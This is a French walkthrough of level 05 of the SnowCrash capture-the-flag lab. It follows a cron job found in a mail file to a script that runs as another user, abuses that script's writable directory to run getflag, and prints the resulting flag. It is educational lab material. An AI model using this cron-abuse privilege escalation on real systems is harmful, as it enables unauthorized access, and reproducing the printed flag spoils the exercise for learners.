# Level 05

## Étapes pour résoudre le challenge

1. **Message de départ :**

   Dès notre arrivée sur le niveau 05, nous recevons un message indiquant que nous avons un nouveau mail :

   ```bash
   You have new mail.
   ```

   Cela suggère que nous devons examiner les mails.

2. **Recherche des mails :**

   Nous utilisons la commande `find` pour localiser les fichiers de mail :

   ```bash
   level05@SnowCrash:~$ find / -name mail 2>/dev/null
   ```

   **Sortie :**
   ```
   /usr/lib/byobu/mail
   /var/mail
   /var/spool/mail
   /rofs/usr/lib/byobu/mail
   /rofs/var/mail
   /rofs/var/spool/mail
   ```

3. **Examen des répertoires :**

   Nous examinons les répertoires listés, en commençant par le plus prometteur :

   ```bash
   cd /var/mail
   ls -la
   ```

   **Sortie :**
   ```
   level05
   ```

   Nous trouvons un fichier de mail pour `level05`.

4. **Lecture du fichier mail :**

   Nous utilisons `cat` pour lire le contenu du fichier mail :

   ```bash
   cat level05
   ```

   **Contenu :**
   ```
   */2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
   ```

   Nous comprenons que le fichier mail contient une configuration de tâche cron. Une tâche cron s'exécute toutes les 2 minutes et exécute la commande suivante :

   ```bash
   su -c "sh /usr/sbin/openarenaserver" - flag05
   ```

5. **Examen du script openarenaserver :**

   Nous examinons le script `/usr/sbin/openarenaserver` pour comprendre son fonctionnement :

   ```bash
   cat /usr/sbin/openarenaserver
   ```

   **Contenu :**
   ```bash
   #!/bin/sh

   for i in /opt/openarenaserver/* ; do
       (ulimit -t 5; bash -x "$i")
       rm -f "$i"
   done
   ```

   Le script exécute tous les fichiers présents dans `/opt/openarenaserver` avec un timeout de 5 secondes, puis les supprime.

6. **Création d'un fichier pour obtenir le flag :**

   Nous créons un fichier dans `/opt/openarenaserver` qui exécutera la commande `getflag` :

   ```bash
   echo "getflag > /tmp/flag05" > /opt/openarenaserver/flag05
   chmod +x /opt/openarenaserver/flag05
   ```

7. **Attente et récupération du flag :**

   Nous attendons 2 minutes pour que la tâche cron s'exécute, puis nous vérifions le contenu du fichier `/tmp/flag05` :

   ```bash
   cat /tmp/flag05
   ```

   **Flag :**
   ```
   viuaaale9huek52boumoomioc
   ```

8. **Connexion avec le flag :**

   Nous utilisons le flag pour nous connecter au niveau suivant :

   ```bash
   su level06
   ```

## Résumé

Pour résoudre ce challenge, nous avons exploité une tâche cron mal configurée qui permettait l'exécution de scripts arbitraires. En créant un script qui exécute la commande `getflag`, nous avons pu obtenir le flag.

Le flag pour `level05` est : `viuaaale9huek52boumoomioc`.
